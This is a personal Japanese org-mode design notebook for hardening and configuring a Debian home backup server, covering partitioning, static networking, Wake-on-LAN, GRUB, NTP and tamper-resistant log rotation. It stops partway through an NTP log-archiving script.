-*- coding: utf-8; no-check-type-miss: t; -*-
* Architecture
** KI
   [Server:ki (king)]
*** Policy
**** この文書について
	 この文書は、個人用途のサーバー設計書である。

**** Main Policy
	 -   方針:
		 この文書は、個人的な設定、運用方針の再確認用として使用する。

	 -   設計:
		 個人用途に適した設計を行う。
		 企業や団体、組織用ではない。

	 -   用途:
		 当面 ファイルの保存、レポジトリ、外部記憶装置、
		 バックアップサーバー、とする。
		 外出先から Data にアクセスするインフラを整備。
		 機能は、随時追加して行く。
		 今現在 (2011 年 7 月 29 日) 、 web サーバーは運用するつもりはない。

**** Security Policy
	 [[security_policy1][security_policy]]

*** Device
**** ケース
	 - [ ] エアフローを考え排気は上になるようにする。

	 - [ ] 鍵付きケース
		   COMS clear されることを避ける。

	 - [ ] BIOS で chassis intrusion を設定しケースの開閉を監視
		   開閉されたら shutdown

	 - [ ] 埃対策
		   レンジフィルターにスプレーのりを吹き付けて吸気口に配置。

	 - [ ] 騒音対策

**** マザーボード
	 - BIOS: WOL 対応 RAID 対応
**** network
***** 回線
	  - 回線業者 光通信ができるところ

***** プロバイダ (保留)
	  -  固定 IP

***** network カード
	  - linux kernel がドライバを備えている物。
		kernel のバージョンアップによってサポートされなくなりそうなものは使わない。
		少々高くてもメジャーな物を選択。
		(cf.2011 年 7 月 15 日 [[http://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/examplenatmachine.html][Iptables チュートリアル 1.2.2 Chapter 4 ネットワークアドレス変換とは 4.3.1 NAT マシン構築に必要な物]])
****** MAC
	   - 00:16:17:1B:01:50
***** 有線ケーブル
# 無線 LAN は盗聴の可能性、速度低下、不安定であり有線に比べてメリットがないので使用しない。

	  カテゴリー 6 単線仕様 ストレートを使用。

	  カテゴリー:

	  カテゴリー 5e 　伝送帯域 100MHz 、 10Base-T/100base-TX/1000base-T に対応

	  カテゴリー 6 　伝送帯域 250MHz 、 10base-T/100Base-TX/1000base-TX に対応

	  導体構造  :
	  単線仕様    導体が 1 本の太い銅線で構成されている。
      電気抵抗が小さいので通信特性が高い、また安価である。
      長さにかかわらずこの構造のケーブルを使うのが基本だが、
      極端な曲げに弱いので注意する必要がある。

	  ヨリ線仕様　導体が 7 本の細い銅線で構成されている。
      ケーブル自体の柔軟性が高く取り回しが容易。
      狭いスペースでの短い配線に向いている。
      逆に 10m 以上の長いケーブルは通信特性の面で不利。

**** Watchdog
   	 システムから応答がなくなると再起動を試みる。

**** 消費電力 (40W:保留)
   	 ワットチェッカーで計測
   	 アイドル時 :
   	 高負担時   :

   	 2011 年 06 月 30 日現在 関西電力料金単価
   	 従来電灯 A 15kWh 超過 120kWh まで  1kWh    19 円 05 銭
     120kWh 超過 300kWh まで 1kWh    24 円 21 銭
	 300kWh 超過分         1kWh    25 円 55 銭
   	 1kWh 20 円と仮定 1wh = 0.020 円

**** ハードウェアの点検
	 PC 部品の故障は初期不良であることが多い。
	 バックアップとしてハードウェアの 2 重化などをした場合は慣らし運転が必要。

	 - [ ] memtest86+

**** 耐震対策
*** General
**** OS
- Distribution: Linux Debian 7 wheezy
- kernel:       linux 3.2.0-4-amd64
****** module
- expert install で汎用化を選択

**** Partition
	 :PROPERTIES:
	 :SUMMARY:  partition1
	 :END:

## データサーバー用途で使う。
## 今現在 (2011 年 7 月 26 日) ウェブサーバーとしては考えていない。
## /var パーティションの容量は余裕を持って大きくとる。
## debian は/var/cache/apt/archives にパッケージを download する為であり、
## また、セキュリティを重視するためにも log ファイルのある/var を大きくとる。
##
## /tmp, /home, /var/tmp などの一般ユーザーが書き込める領域は
## "/" のリソースを圧迫する可能性があるので分けた方がよい。
##

## RAID1
## System 30G

## アクセスの多いパーティションはディスクの先頭 (外側) に配置
## パーティションは作った順番で外側から配置される。 (cf.2011 年 7 月 15 日 FreeBSD ハンドブック [[http://www.freebsd.org/doc/ja/books/nandbook/configtuning-initial.html][初期設定]]) (cf. 2011 年 7 月 15 日 [[http://codecraft.jp/tips/index.php?Linux%2F%A5%D1%A1%BC%A5%C6%A5%A3%A5%B7%A5%E7%A5%F3%CA%AC%B3%E4%CE%E3][ Linux/ パーティション分割例 - CodeCraft tips]])


[[file:/data/archive/reference/etc/partition_info_for_server/partition_architecture_memo.pdf][partition_memo.pdf]]

Western digital: 500G  | Win | Windata | server | data |
Hitachi        : 500G  |            Raid 1             |
Western digital: 250G  | winB | temp |  swap  | backup |

- /boot           200M    ext3
# server partition 30G LVM
- /var              6G    ext3   defaults,nodev
- /                 4G    ext3
- /usr              6G    ext3   defaults,nodev
- /usr/local      1.5G    ext3   defaults,nodev
- /home             6G    ext3
- /tmp            6.5G    ext3   defaults,nosuid,noexec,nodev 0 2
- /data  crypt    300G    ext3   defaults,nosuid,noexec,nodev 0 2 (未達)

# backup crypt partition
- /backup                   156G    ext3   defaults,nosuid,noexec,nodev 0 2

cf. [[http://www.debian.org/releases/stable/i386/apcs02.html.ja][Debian GNU/Linux インストールガイド- C.2. ディレクトリツリー]]
cf. [[http://www.debian.org/releases/stable/i386/apcs03.html.ja][Debian GNU/Linux インストールガイド- C.3. お勧めするパーティションルール]]

**** Host Name
- /etc/hostname
  ki
  (cf. [[file:~/mydoc/linux/etc/how_to_define_hostname][how_to_define_hostname]])
**** IP & Domain
***** Static Global IP
	  - ***.***.***.***
***** Static local IP
      :PROPERTIES:
      :SUMMARY:  interface1
      :END:

	  - 192.168.1.123

		# nano /etc/network/inerfaces

# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces (5).

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
allow-hotplug eth0
#iface eth0 inet dhcp

# Static IP address
iface eth0 inet static
		ethernet-wol gb # for WOL
		address 192.168.1.123
		netmask 255.255.255.0
		network 192.168.1.0
		broadcast 192.168.1.255
		gateway 192.168.1.1
        # dns-* options are implemented by the resolvconf package, if installed
        dns-nameservers 192.168.1.1

# The primary network interface
allow-hotplug eth1
iface eth1 inet static
        ethernet-wol gb  # for WOL
        address 192.168.1.123
        netmask 255.255.255.0
        network 192.168.1.0
        broadcast 192.168.1.255
        gateway 192.168.1.1
        # dns-* options are implemented by the resolvconf package, if installed
        dns-nameservers 192.168.1.1


		# /etc/init.d/networking restart
		or
		# ifdown eth0 && ifup eth0
***** WOL
http://ah-ithasbeenforgotten.blogspot.jp/2015/04/jessie-wakeonlan.html


wheezy では /etc/network/interfaces  に ethernet-wol g とか書いておけばよかったのだが、 jessie ではどうもこれがうまく効いてない。

sysvinit から systemd-networkd へ変更したのもあって、 wakeonlan の設定も systemd から呼び出すことにした。

 (他に udev の方で設定することも出来るらしいが udev 設定するのは見通しわるくなるしあまり気乗りしない)

具体的には /etc/systemd/system/wol@.service というファイルを用意する 


@on-jessie:~$ sudo vi /etc/systemd/system/wol@.service

/etc/systemd/system/wol@.service

[Unit]
Description=Wake-on-LAN for %i
Requires=network.target
After=network.target

[Service]
ExecStart=/sbin/ethtool -s %i wol g
Type=oneshot

[Install]
WantedBy=multi-user.target


wheezy から jessie へ dist-upgrade した環境の場合、テストするには

@on-jessie:~$ sudo systemctl restart networking.service

して
@on-jessie:~$ sudo ethtool eth0
してみる。



/sbin/ethtool コマンドがないならインストールする。
@on-jessie:~$ sudo apt-get install ethtool
使ってるネットワークインターフェイスがどのタイプの WakeOnLan をサポートしているのかは、 ethtool コマンドで調べられる。

wakeonlan のタイプには p (phy),u (unicast),m (multicast),b (broadcast),a (arp),g (MagickPacket&#x2122;),s (SecureOn&tm; MagickPacket&#x2122;),d がある。

@on-jessie:~$ man ethtool

@on-jessie:~$ sudo ethtool eth0
    [...] 
    Supports Wake-on: umbg
    Wake-on: g

wakaonlan パッケージや etherwake を使うと g とか s で LAN 内の特定のマシンを起動できるので便利。

また /etc/ethers に MAC とマシン名の対応、コメントを書いておくと MAC ではなくマシン名で呼び出せるので便利。

 追記 2015-08-24

jessie を dist-upgrade ではなく、クリーンインストールした環境では上記では不十分で、以下が必要。

テストするには、 (eth0 は該当インターフェイス名、 wol@.service ファイルの %i に置き換えられる)

sudo systemctl start wol@eth0.service

うまく行ったなら、

sudo systemctl enable wol@eth0.service 

***** Domain
**** User
	 - t1
*** Boot
**** BIOS
	 - RAID1 /data パーティションに設定
	 - CD/FDD/USB からの起動を禁止。
	 - PassWord 設定。
	 - CPU/FAN の稼働率を低めに設定。
***** WOL
	  - # BIOS の"resume by pci device" の項目を enable にする。
		(cf.. [[http://www.edmondweblog.com/index.php/2011/01/06/wake-on-lan-wol-su-debian-squeeze/][Wake on LAN (WOL) su Debian Squeeze | EDMOND'S WEBLOG]])
		(cf.. [[http://www.stained-g.net/wiki/shinichiro/pukiwiki.php?Wake%20on%20LAN%20%A4%A2%A4%EC%A4%B3%A4%EC][Wake on LAN あれこれ - Shinichiro ' s Wiki]])
# debian は default で WOL が有効になっていない
# 起動時に有効にする
	  - # [[apt-get_install][apt-get install ethtool]]
		# nano [[interface1][/etc/network/interface]]
		iface eth0 inet static
		ethernet-wol g  # 追加


****** init.d
	   - # nano /etc/init.d/wol
		 ## /etc/init.d/wol
		 ethtool -s eth0 wol g
		 exit

		 # chmod +x /etc/init.d/wol
		 # sudo update-rc.d wol defaults


****** set by Hand
	   - # ethtool -s eth0 wol g
****** check setting
	   - # ethtool eth0
****** windows
	   - devmgmt.msc
		 Realtek RTL8139/810x Family Fast Ethernet NIC を開く。
		 詳細設定
		 "APM モードを使ったウェークアップ" 無効
		 "ARP/PING でウェークアップ" 無効
		 "LAN 上のウェークアップのシャットダウン" 有効
		 電源の管理
		 全てにチェックを入れる。
**** GRUB
	 - /boot/grub/grub.cfg
# 最後に必ず update-grub
***** /etc/default/grub
      :PROPERTIES:
      :SUMMARY:  etc-default-grub.cfg
      :END:

	  - # orig /etc/default/grub

	  - GRUB_TIMEOUT=0
	  - GRUB_HIDDEN_TIMEOUT=0            # メニュー非表示
	  - GRUB_HIDDEN_TIMEOUT_QUIET=true   #
	  - GRUB_CMDLINE_LINUX_DEFAULT="quiet vga=791"
***** grub menu の順番変更
	  - デュアルブートディスクで OS のデフォルトで起動する順番を変更。
# windows が入った PC 後に linux をインストールすると
# linux が優先的に起動する。
#
# menu の順番は/etc/grub.d/ の中のファイルの優先順位を変る。
# 優先順位は数字、アルファベットの順番で決まる。

****** Desktop mode / windows を優先して起動する。
   	   # ls /etc/grub.d/
   	   00_header        10_linux      30_os-prober  41_custom
   	   05_debian_theme  20_linux_xen  40_custom     README

   	   10_linux が linux の OS メニューを生成する。
   	   30_os_prober が他の OS (windows) のメニューを生成する。
   	   ファイルの先頭の若い番号順にファイルが読み込まれて 1 つの/boot/grub/grub.cfg が生成される。
   	   よって、 windows をデフォルトで起動したい場合は、

   	   # mv /etc/grub.d/30_os-prober /etc/grub.d/06_os-prober
   	   # update-grub

****** Server mode / linux を優先して起動する。
# windows の後に linux を install すると後者が優先的に起動する。
# 設定を弄った場合は下記の状態に戻す。

	   # ls /etc/grub.d/
	   00_header        10_linux      30_os-prober  41_custom
	   05_debian_theme  20_linux_xen  40_custom     README

	   # update-grub

***** grub の画面を標準に戻す。
      :PROPERTIES:
      :SUMMARY:  /etc/grub.d1
      :END:

	  - # rm /etc/grub.d/05_debian_theme

***** GRUB single user にパスワード
      :PROPERTIES:
      :SUMMARY:  GRUB password
      :END:

# メニュー項目編集から single user mode に入れるので
# 悪戯防止程度と考えておく
# password が暗号化する場合は password_pbkdf2 t1 grub.pbkdf2.sha512.10000.<hash> とする。
# 2011 年 7 月 10 日現在 grub-mkpasswd-pbkdf2 が正しく機能しないので平文のパスワードにする。
	  - # nano /etc/grub.d/10_linux
		echo >> EOF
		set superusers="t1"
		password t1 <password>
		EOF

		# nano 10_linux
		if ${recovery}; then
		title="$(gettext~~~~~~~~~~.......
		CLASS="${CLASS} --users t1"   # 追加
		else

**** /etc/fstab
	 - # orig /etc/fstab
***** 一般ユーザーで usb mount
      :PROPERTIES:
      :SUMMARY:  usb_mount1
      :END:

	  - # mkdir /media/usb
		# nano /etc/fstab
		/dev/sdc1  /media/usb auto noauto,rw,user,iocharset=utf8 0 0

		# mount /media/usb

**** /etc/inittab
	 :PROPERTIES:
	 :SUMMARY:  etc-inittab
	 :END:

	 - # orig /etc/inittab

# check runlevel
	 - # runlevel

# comment out getty
	   1:2345:respawn:/sbin/getty 38400 tty1
	   2:23:respawn:/sbin/getty 38400 tty2
	   3:23:respawn:/sbin/getty 38400 tty3
#4:23:respawn:/sbin/getty 38400 tty4
#5:23:respawn:/sbin/getty 38400 tty5
#6:23:respawn:/sbin/getty 38400 tty6

**** /etc/rcS.d/
**** /etc/rc<n>.d/
**** /etc/init.d/
***** (保留) 起動時、/etc/init.d/ の並列処理化
      :PROPERTIES:
      :SUMMARY:  etc-default-rcS1
      :END:

# read /usr/share/doc/insserv/README.debian
	  - # orig /etc/default/rcS
		# nano /etc/default/rcS
		CONCURRENCY=startpar

# none     = 並列処理なし
# startpar = 同一順位番号間の並列処理
# makefile = 完全な並列処理

**** fsck
	 (cf.. [[http://www.itmedia.co.jp/help/howto/linux/redhat7_2_ext3/03.html][エンタープライズ: Linux How-To   第 2 回:「 ext2 を使いこなす」]])

	 - # tune2fs -l /dev/<fs>
	 - # tune2fs -c 180 /dev/mapper/VG-LVdata
	   # tune2fs -c 180 /dev/mapper/VG-LVhome
	   # tune2fs -c 180 /dev/mapper/VG-LVtmp
	   # tune2fs -c 180 /dev/mapper/VG-LVusr
	   # tune2fs -c 180 /dev/mapper/VG-LVusrlocal
	   # tune2fs -c 180 /dev/mapper/VG-LVvar
	   # tune2fs -c 180 /dev/mapper/VG-LVrootfs
	   # tune2fs -c 180 /dev/mapper/backupfs_crypt
*** System
**** kernel patches
	 - selinux
	 - linux trustees
	 - IPSEC
**** system
***** Locale
      :PROPERTIES:
      :SUMMARY:  change_locale1
      :END:

# check locale
	  - # locale -a
# change locale
		# dpkg-reconfigure locales
		en_US.UTF-8
***** /etc/default/rcS
	  - # nano /etc/default/rcS
		UTC=yes

***** Login Shell
      :PROPERTIES:
      :SUMMARY:  change_login_shell1
      :END:
	  - zsh
	  - # [[apt-get_install][apt-get install zsh]]
****** Change login shell
# check login shell
	   - # echo $SHELL
	   - # cat /etc/passwd

# change login shell
	   - # chsh
		 Password:
		 Changing theogin shell for root
		 Enter the new value, or press ENTER for the default
		 Login Shell [/bin/sh]: /bin/zsh

	   - or: edit passwd

***** /etc/apt/apt.conf.d/30disable-recommends
      :PROPERTIES:
      :SUMMARY:  etc-apt-apt.conf
      :END:
# recommends をインストールさせない。
APT
{
Install-Recommends "false";
}

***** aptitude purge
      :PROPERTIES:
      :SUMMARY:  aptitude_purge
      :END:

	  - laptop-detect
***** apt-get install
      :PROPERTIES:
      :SUMMARY:  apt-get_install
      :END:
	  - # apt-get update
		# apt-get install [[file:script/init.py][install_list]]

# manual install
	  - tripwire

# contrib
	  - sdic sdic-edict sdic-gene95

# non-free
	  - emacs23-common-con-dfsg

# develop
	  - nasm binutils gcc libc6-dev python-doc python-ropemacs python-paramiko dpkg-dev gdb

Added: 2013 年 09 月 12 日
  unattended-upgrades debsums
  gcc g++ binutils dpkg-dev nasm build-essential make automake m4 patch
  logrotate chkconfig cryptsetup sudo ethtool anacron less wakeonlan
  ntp ulogd subversion
  rsync ntpdate nmap tcpdump traceroute
  python-pip python-dev gzip p7zip-full unzip zip gawk zsh lsof finger
manual:
  localepurge


***** apt-get install localepurge
# chose en en_US.UTF-8 ja ja.UTF-8
	  - # localepurge
***** sudo のみで権限実行 root 化禁止 (保留)
	  - sudo をインストール、一般 user に sudo 権限を与える。
		# nano /etc/shadow
		root の行の: の 2 つ目を"!" にする。
		"!"はログイン禁止

****** shutdown on user (保留)
	   - # visudo
# 最後に追記 root よりも上に記述すると反映されない。
		 t1	 ALL=NOPASSWD: /sbin/shutdown,/sbin/halt,/sbin/reboot

		 $ sudo /sbin/{shutdown,halt,reboot}

		 [man sudoers]

***** change default editor
	  - # update-alternatives --config editor
***** /etc/login.defs
      :PROPERTIES:
      :SUMMARY:  etc-login.defs
      :END:
	  - # orig /etc/login.defs
	  - # nano /etc/login.defs

		LOG_OK_LOGINS yes
		SULOG_FILE /var/log/sulog
# remove     /usr/local/games:/usr/games
		ENV_PATH
		UMASK 077
		MD5_CRYPT_ENAB  yes

***** /etc/profile
	  - # orig /etc/profile
	  - # nano /etc/profile

#if [ "`id -u`" -eq 0 ]; then
		PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
#else
#  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
#fi
		export PATH

***** delete games line
	  - /etc/passwd /etc/passwd- /etc/group /etc/group- /etc/shadow /etc/shadow-
		/etc/zsh/zshenv /etc/manpath.config
***** Ctrl+ALT+DEL のリブートを制限 (保留)
	  - # grep ctraltdel /etc/inittab
# shutdown に-a オプションが付いているか確認
# 付いていれば/etc/shutdown.allow を読みに行く。
		ca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now

		# nano /etc/shutdown.allow
		t1

***** static arp (保留 実験必要)
	  - command line
		# arp -s <host_name> <hdwr_addr>

	  - # nano /etc/ethers
		<mac_address> <ip_num>
		00:1d:73:1a:c0:9c 192.168.1.1

**** network
***** disable ipv6
      :PROPERTIES:
      :SUMMARY:  disable_ipv61
      :END:

	  - # echo net.ipv6.conf.all.disable_ipv6=1 > /etc/sysctl.d/disableipv6.conf
		# sysctl -p  # 即時反映

	  - # nano /etc/hosts
# comment out ipv6 line

	  - # orig /etc/ssh/sshd_config
		# nano /etc/ssh/sshd_config
		AddressFamily inet  # disable ipv6

		# Remove debian's version of Banner
		DebianBanner no


	  - # orig /etc/default/ntp
		# nano /etc/default/ntp
		NTPD_OPTS='-4 -g'

	  - # nano /etc/exim4/update-exim4.conf.conf
		dc_local_interfaces='127.0.0.1'
		update-exim4.conf
		rm /var/log/exim4/paniclog
***** ntp
****** ntpd
       :PROPERTIES:
       :SUMMARY:  etc-ntp.conf
       :END:

## 基本的にプロバイダの ntp サーバーを使うこと。
## クライアントからホップ数が少ないサーバーがよい。
## 大阪府立大学: eagle.center.osakafu-u.ac.jp
## (独) 情報通信研究機構: ntp.nict.jp
## アクセス制限 1 時間平均 20 回 (1 日合計 480 回) まで
## (cf. 2011 年 7 月 16 日 [[http://www2.nict.go.jp/w/w114/tsp/PubNtp/qa.html#q1-4][ 日本標準時プロジェクト公開 NTP FAQ]])

	   - # [[apt-get_install][apt-get install ntp]]
		 # orig ntp.conf
		 # nano /etc/ntp.conf
		 statsdir /var/log/ntpstats/    # for log

# -4 は強制的に ipv4 を使う。
# iburst は起動時に多数ポーリングし、初期化時間を短縮する。
# 4 分から 17 分までの間隔で通信。
# minpoll 2**8  / 60 =  4 min
# maxpoll 2**10 / 60 = 17 min
# 応答が速い順
		 server -4 eagle.center.osakafu-u.ac.jp minpoll 8 maxpoll 10 iburst # 大阪府立大学
		 # server -4 ntp.bbtec.net minpoll 8 maxpoll 10 iburst                # provider
		 server -4 ntp.nict.jp minpoll 8 maxpoll 10 iburst                 # (独) 情報通信研究機構

# disable ipv6
# restrict -6 default kod notrap nomodify nopeer noquery # comment out
# restrict ::1 # comment out

# ntp でファイヤーウォール
# LAN 内からのアクセス許可
		 restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap

# IP は変更される可能性があるので注意
# eagle.center.osakafu-u.ac.jp
		 restrict 157.16.213.52 mask 255.255.255.255 nomodify notrap noquery

# ntp.bbtec.net
		 # restrict 219.188.200.128 mask 255.255.255.255 nomodify notrap noquery

# ntp.nict.jp
		 restrict 133.243.238.244 mask 255.255.255.255 nomodify notrap noquery
		 restrict 133.243.238.243 mask 255.255.255.255 nomodify notrap noquery
		 restrict 133.243.238.164 mask 255.255.255.255 nomodify notrap noquery
		 restrict 133.243.238.163 mask 255.255.255.255 nomodify notrap noquery

		 - # service ntp restart
# check ntp
		 - # ntpq -p

## 問題点
		   [[file:~/Doc/memo/negative_list::ntp.conf にて restrict で][restrict によるファイアーウォールの問題 negative_list]]

****** ntpdate クライアントで時刻合わせ (使用しない)
	   - # apt-get install ntpdate
		 # nano /etc/default/ntpdate
		 NTPDATE_USE_NTP_CONF=no
		 NTPSERVERS="ntp.nict.jp ntp.jst.mfeed.ad.jp"
# nict.jp のホームページを見ると頻繁ではないが
# 障害が何度かあるようなので、念のために予備で mfeed.ad.jp も追加。
# mfeed.ad.jp も nict.jp から時間を取得しているよう...

# (独) 情報通信研究機構: ntp.nict.jp
# アクセス制限 1 時間平均 20 回 (1 日合計 480 回) まで
# (cf. 2011 年 7 月 16 日 [[http://www2.nict.go.jp/w/w114/tsp/PubNtp/qa.html#q1-4][ 日本標準時プロジェクト公開 NTP FAQ]])

# インターネットマルチフィード株式会社: ntp.jst.mfeed.ad.jp

		 (cf. $ man ntpdate)
		 (cf. $ man ntpdate-debian)
		 (cf. [[http://somenotes.seesaa.net/article/117217642.html][NTP で時刻合わせ、 cron の設定 (Debian/lenny): プログラミング関係ごちゃごちゃメモ]]; 2011 年 7 月 13 日)

# /etc/cron.hourly で 1 時間ごとに自動化
		 - # mkdir /var/log/ntp
		 - # touch /var/log/ntp/ntp.log
		 - # nano /etc/cron.hourly/ntpdate
		   #!/bin/sh

		   #/etc/cron.hourly/
		   #log は syslog を通さず/var/log/ntp.log に保存。
		   /usr/sbin/ntpdate-debian >> /var/log/ntp.log

		 - # chmod +x /etc/cron.hourly/ntpdate

# logrotate
****** ntp logrotate
       :PROPERTIES:
       :SUMMARY:  ntp-logrotate
       :END:

## 問題発生時に保守しやすくする為、月ごとにフォルダに分け保存する。
## ntp で log を取るために/etc/ntp.conf を編集
	   - # [[etc-ntp.conf][nano /etc/ntp.conf]]

## ntp の log は作られて 1 週間過ぎると削除される。
## それを行っているのが下記の script のコマンド。
## それをコメントアウトする。
	   - [[ntpstats/$year/$month][logrotate ntp]]

***** /etc/hosts
      :PROPERTIES:
      :SUMMARY:  etc-hosts
      :END:

	  192.168.1.1     ro    # default gateway (router)
	  192.168.1.100   m     # haha
	  192.168.1.122   home  # home
	  192.168.1.130   qu    # desktop
	  192.168.1.123   ki    # server

# for test server
	  192.168.1.111   pa
	  192.168.1.112   pa2
	  192.168.1.113   pa3

**** Log
***** log の重要性
****** 不正アクセス
## log 情報なしに不正侵入の検知は難しい。
## 又、 log 情報なしに不正侵入の証明も難しい。
# もしコンピューターが踏み台にされ、相手に被害を与えてしまった時、
# 不正アクセスによるものだという証明をする必要がある。

****** 保守点検
***** 予備知識
	  /var/log/messages  一般的なシステムに関する情報
	  /var/log/cron      定期的に実行される処理の結果に関する情報
	  /var/log/mail.log  メールに関する情報
	  /var/log/auth.log  セキュリティに関する情報
	  /var/log/spooler   印刷やニュースに関する情報
	  /var/log/boot      OS 起動時に関する情報
	  /var/log/lastlog   ユーザの最終ログイン時間   閲覧するには lastlog コマンド
	  /var/log/utmp      現在ログインしているユーザ情報  閲覧するには w コマンド
	  /var/log/wtmp      ログイン履歴        閲覧するには last コマンド
***** 信頼性確保
## log の信頼性向上の為に ntp で外部 ntp サーバーとの同期をする。
## 同期したログを長期保存してくれるところが良い。
## 外部 ntp サーバーの迷惑とならない程度に ntp の同期の間隔は短いものがよい。

***** 保存期間
## 不正アクセスに関わる log は基本的に永久保存。
## しかし、ディスク容量が足りない場合は、最低 5 年保存。
## 保存期間の根拠は、不正アクセスの時効が犯行が終わった時点から 3 年である為
## 余裕を持って 5 年とする。
## (cf. 2011 年 7 月 26 日 [[file:~/Doc/law.org::時効は、人を死亡させた罪であつて][刑事訴訟法-第二百五十条]] 、第二百五十三条)
## (cf. 2011 年 7 月 26 日 [[file:~/Doc/law.org::第八条　次の各号の一に該当する者は][不正アクセス行為の禁止等に関する法律-第八条-第九条]])

	  不正アクセス関連: 永久保存、若しくは 5 年
	  保守& その他    : それぞれにあわせて適用

***** 長期保存対象 (不正アクセス関連)
## 長期保存する log は主に
## システム                                   = syslog
## 起動                                       = syslog
## shutdown                                   = user
## ログイン履歴                               = auth
## アクセスログ                               = iptables
## ログの信憑性を証明する ntp ログを保存する。 = ntp

****** rotate daily
	   - [[etc/logrotate.d/rsyslog][rsyslog]]          : /var/log/syslog /var/log/rsyslog/
	   - [[etc/logrotate.d/ulogd][ulogd (iptables)]]  : /var/log/iptables/iptables.log
	   - [[etc/cron.daily/ntp][ntp]]              : /var/log/ntpstats/

****** rotate monthly
	   - [[etc/logrotate.d/auth][auth]]             : /var/log/auth.log
	   - [[etc/logrotate.d/cron][cron]]             : /var/log/cron.log

****** rotate yearly
	   - [[etc/logrotate.d/user][user]]             : /var/log/user.log

***** 保守点検対象
****** rotate monthly
******* /etc/logrotate.d/etc
		/var/log/mail.info
		/var/log/mail.warn
		/var/log/mail.err
		/var/log/mail.log
		/var/log/daemon.log
		/var/log/kern.log
		/var/log/lpr.log
		/var/log/debug
		/var/log/messages
		{
		rotate 6
		monthly
		missingok
		notifempty
		compress
		delaycompress
		sharedscripts
		postrotate
		invoke-rc.d rsyslog reload > /dev/null
		endscript
		}

***** 改竄対策 (保留)
## [[(log の重要性]]) の通り log なしに不正侵入の証明が困難である。
## しかし、不正侵入者は侵入発覚を避ける為に log 記録の改竄、削除を試みると考えられる。
## この改竄、削除から保護する必要がある。

	  chattr +a
	  chattr +i

***** logrotate.conf
# see "man logrotate" for details
# rotate log files weekly
	  weekly

# keep 4 weeks worth of backlogs
	  rotate 4

# create new (empty) log files after rotating old ones
	  create

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
	  include /etc/logrotate.d

# no packages own wtmp, or btmp -- we'll rotate them here
	  /var/log/wtmp {
      rotate 12
      monthly
      missingok
      dateext
      dateformat -%Y-%m
      create 0664 root utmp
      postrotate
	  nameformat="wtmp-????-??"
	  if [ -e /var/log/$nameformat ]; then
	  for file in $(ls /var/log/$nameformat); do
	  year=`ls $file | cut -d "-" -f 2`
	  month=`ls $file | cut -d "-" -f 3`
	  logdir=/var/log/wtmplog/$year/$month
	  mkdir -p $logdir
	  mv $file $logdir
	  /usr/bin/chattr +i $logdir/$nameformat
	  if [ -e /var/log/$nameformat ]; then
	  continue
	  else
	  break
	  fi
	  done;
	  fi
      endscript
	  }

	  /var/log/btmp {
      rotate 12
      monthly
      missingok
      dateext
      dateformat -%Y-%m
      create 0660 root utmp
      postrotate
	  nameformat="btmp-????-??"
	  if [ -e /var/log/$nameformat ]; then
	  for file in $(ls /var/log/$nameformat); do
	  year=`ls $file | cut -d "-" -f 2`
	  month=`ls $file | cut -d "-" -f 3`
	  logdir=/var/log/btmplog/$year/$month
	  mkdir -p $logdir
	  mv $file $logdir
	  /usr/bin/chattr +i $logdir/$nameformat
	  if [ -e /var/log/$nameformat ]; then
	  continue
	  else
	  break
	  fi
	  done;
	  fi
      endscript
	  }

# system-specific logs may be configured here

***** /var/log/
****** rsyslog
******* /etc/logrotate.d/rsyslog
		:PROPERTIES:
		:SUMMARY:  etc-logrotate.d-rsyslog
		:END:

		/var/log/syslog
		{
		rotate 7
		daily
		missingok
		delaycompress
		compress
		dateext
		dateformat -%Y-%m-%d
		prerotate
		/usr/bin/chattr -a /var/log/syslog
		endscript
		postrotate
	    nameformat="syslog-????-??-??.gz"
		if [ -e /var/log/$nameformat ]; then
		for file in $(ls /var/log/$nameformat); do
		year=`ls $file | cut -d "-" -f 2`
		month=`ls $file | cut -d "-" -f 3`
		logdir=/var/log/rsyslog/$year/$month
		mkdir -p $logdir
		mv $file $logdir
		/usr/bin/chattr +i $logdir/$nameformat
		if [ -e /var/log/$nameformat ]; then
       	continue
		else
		break
		fi
		done;
		fi

		invoke-rc.d rsyslog reload > /dev/null
		/usr/bin/chattr +a /var/log/syslog
		endscript

		}

****** ulogd
       :PROPERTIES:
       :SUMMARY:  ulogd1
       :END:

# apt-get install ulogd
# mkdir /var/log/iptables && touch /var/log/iptables/iptables.log
******* /etc/ulogd.conf
		[LOGEMU]
		file="/var/log/iptables/iptables.log"
		sync=1
******* /etc/logrotate.d/ulogd
		/var/log/ulog/*.log {
		missingok
		compress
		sharedscripts
		create 640 root adm
		postrotate
		/etc/init.d/ulogd reload
		endscript
		}


		/var/log/iptables/iptables.log {
		daily
		rotate 10
		dateext
		dateformat -%Y-%m-%d
		missingok
		compress
		sharedscripts
		create
		ifempty
		prerotate
		/usr/bin/chattr -a /var/log/iptables/iptables.log
		endscript
		postrotate
		/usr/bin/chattr +a /var/log/iptables/iptables.log

# mv to archive
    	cd /var/log/iptables
		for file in $(ls iptables.log-????-??-??.gz); do
	    year=`ls $file | cut -d "-" -f2`;
	    month=`ls $file | cut -d "-" -f3`;
	    logdir=/var/log/iptables/$year/$month
	    mkdir -p $logdir
	    mv $file $logdir
	    if [ -e iptables.log-????-??-??.gz ]; then
	    continue
	    else
	    break
   	    fi
		done;
		/etc/init.d/ulogd reload
		endscript
		}

****** ntpstats
******* /etc/cron.daily/ntp
#!/bin/sh

# The default Debian ntp.conf enables logging of various statistics to
# the /var/log/ntpstats directory.  The daemon automatically changes
# to a new datestamped set of files at midnight, so all we need to do
# is delete old ones, and compress the ones we're keeping so disk
# usage is controlled.

		statsdir=$(cat /etc/ntp.conf | grep -v '^#' | sed -n 's/statsdir \([^ ][^ ]*\)/\1/p')

		if [ -n "$statsdir" ] && [ -d "$statsdir" ]; then
		# only keep a week's depth of these
        #find "$statsdir" -type f -mtime +7 -exec rm {} \; # comment out

		# compress whatever is left to save space
		cd "$statsdir"

# move to directory
		for file in $( ls *stats.????????.gz ); do
		year=`ls $file | cut -d "." -f2 | cut -c-4 `
		month=`ls $file | cut -d "." -f2 | cut -c5-6 `
		logdir=/var/log/ntpstats/$year/$month
		mkdir -p $logdir
		mv $file $logdir
